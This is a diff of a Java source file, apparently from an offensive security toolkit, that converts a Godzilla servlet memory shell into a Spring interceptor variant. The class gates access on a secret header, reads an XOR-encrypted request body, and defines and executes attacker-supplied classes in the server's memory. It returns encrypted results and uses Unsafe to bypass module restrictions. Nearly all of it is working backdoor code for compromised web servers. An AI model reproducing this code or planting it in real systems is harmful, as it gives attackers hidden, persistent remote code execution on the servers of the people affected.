@@ -4,9 +4,10 @@ import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.MemShellFunction;
 import com.ppp.annotation.MemShellType;
-import com.ppp.middleware.loader.SpringInterceptorContextLoader;
 import sun.misc.Unsafe;
 
+import java.io.InputStream;
+import java.io.OutputStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Method;
@@ -16,54 +17,76 @@ import java.net.URLClassLoader;
 /**
  * @author Whoopsunix
  */
-@MemShell(MemShell.Servlet)
+@MemShell(MemShell.Interceptor)
 @MemShellFunction(MemShellFunction.Godzilla)
-@MemShellType(MemShellType.Default)
+@MemShellType(MemShellType.Raw)
 @JavaClassModifiable({JavaClassModifiable.key, JavaClassModifiable.pass, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
-public class ServletGodzilla implements InvocationHandler {
+public class InterceptorGodzillaRaw implements InvocationHandler {
     public static String key; // key
     public static String pass;
-    public static String md5 = md5(pass + key);
     private static String lockHeaderKey;
     private static String lockHeaderValue;
 
+    public InterceptorGodzillaRaw() {
+    }
+
     public Object invoke(Object proxy, Method method, Object[] args) {
-        if (method.getName().equals("service")) {
-            run(args[0], args[1]);
+        if (method.getName().equals("preHandle")) {
+            return run(args[0], args[1], args[2]);
         }
         return null;
     }
 
-    private void run(Object servletRequest, Object servletResponse) {
+    private boolean run(Object request, Object response, Object handler) {
         try {
             addModule();
-            String lv = (String) invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
+            String lv = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
             if (lv == null || !lv.contains(lockHeaderValue)) {
-                return;
+                return true;
             }
-            Object session = invokeMethod(servletRequest, "getSession", new Class[]{}, new Object[]{});
 
-            String p = (String) invokeMethod(servletRequest, "getParameter", new Class[]{String.class}, new Object[]{pass});
-            byte[] data = base64Decode(p);
-            data = x(data, false);
+            Class requestClass = null;
+            try {
+                requestClass = Class.forName("javax.servlet.ServletRequest");
+            } catch (Exception e) {
+                try {
+                    requestClass = Class.forName("jakarta.servlet.ServletRequest");
+                } catch (ClassNotFoundException ex) {
+
+                }
+            }
+            Object session = invokeMethod(request, "getSession", new Class[]{}, new Object[]{});
+
+            byte[] data = new byte[Integer.parseInt((String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{"Content-Length"}))];
+            InputStream inputStream = (InputStream) invokeMethod(requestClass, request, "getInputStream", new Class[]{}, new Object[]{});
+            int bytesRead;
+            int offset = 0;
+            while (offset < data.length && (bytesRead = inputStream.read(data, offset, data.length - offset)) != -1) {
+                offset += bytesRead;
+            }
+            inputStream.close();
             Object payload = invokeMethod(session, "getAttribute", new Class[]{String.class}, new Object[]{"payload"});
+
+            data = x(data, false);
+
             if (payload == null) {
                 invokeMethod(session, "setAttribute", new Class[]{String.class, Object.class}, new Object[]{"payload", defClass(data)});
+                return false;
             } else {
-                invokeMethod(servletRequest, "setAttribute", new Class[]{String.class, Object.class}, new Object[]{"parameters", data});
+                invokeMethod(requestClass, request, "setAttribute", new Class[]{String.class, Object.class}, new Object[]{"parameters", data});
                 java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                 Class cls = (Class) invokeMethod(session, "getAttribute", new Class[]{String.class}, new Object[]{"payload"});
                 Object f = cls.newInstance();
                 f.equals(arrOut);
-                f.equals(servletRequest);
-                Object writer = invokeMethod(servletResponse, "getWriter", new Class[]{}, new Object[]{});
-                invokeMethod(writer, "write", new Class[]{String.class}, new Object[]{md5.substring(0, 16)});
+                f.equals(request);
                 f.toString();
-                invokeMethod(writer, "write", new Class[]{String.class}, new Object[]{base64Encode(x(arrOut.toByteArray(), true))});
-                invokeMethod(writer, "write", new Class[]{String.class}, new Object[]{md5.substring(16)});
+                OutputStream outputStream = (OutputStream) invokeMethod(response, "getOutputStream", new Class[]{}, new Object[]{});
+                outputStream.write(x(arrOut.toByteArray(), true));
+                return false;
             }
         } catch (Throwable e) {
         }
+        return true;
     }
 
     public Class defClass(byte[] classBytes) throws Throwable {
@@ -81,54 +104,6 @@ public class ServletGodzilla implements InvocationHandler {
         } catch (Exception e) {
             return null;
         }
-    }
-
-    public static String md5(String s) {
-        String ret = null;
-        try {
-            java.security.MessageDigest m;
-            m = java.security.MessageDigest.getInstance("MD5");
-            m.update(s.getBytes(), 0, s.length());
-            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
-        } catch (Exception e) {
-        }
-        return ret;
-    }
-
-    public static String base64Encode(byte[] bs) throws Exception {
-        Class base64;
-        String value = null;
-        try {
-            base64 = Class.forName("java.util.Base64");
-            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
-            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
-        } catch (Exception e) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Encoder");
-                Object Encoder = base64.newInstance();
-                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
-            } catch (Exception e2) {
-            }
-        }
-        return value;
-    }
-
-    public static byte[] base64Decode(String bs) throws Exception {
-        Class base64;
-        byte[] value = null;
-        try {
-            base64 = Class.forName("java.util.Base64");
-            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
-            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
-        } catch (Exception e) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
-            } catch (Exception e2) {
-            }
-        }
-        return value;
     }
 
     public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
@@ -149,14 +124,18 @@ public class ServletGodzilla implements InvocationHandler {
     }
 
     public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
-        Method method;
         try {
-            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
-        } catch (NoSuchMethodException e) {
-            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
+            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
+        } catch (Exception e) {
+            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
         }
+    }
+
+    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        Method method = cls.getDeclaredMethod(methodName, argsClass);
         method.setAccessible(true);
-        return method.invoke(obj, args);
+        Object object = method.invoke(obj, args);
+        return object;
     }
 
     public static void addModule() {
@@ -168,7 +147,7 @@ public class ServletGodzilla implements InvocationHandler {
             Method method = Class.class.getDeclaredMethod("getModule");
             method.setAccessible(true);
             Object module = method.invoke(Object.class);
-            Class cls = ServletGodzilla.class;
+            Class cls = InterceptorGodzillaRaw.class;
             long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
             Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
             getAndSetObjectMethod.setAccessible(true);
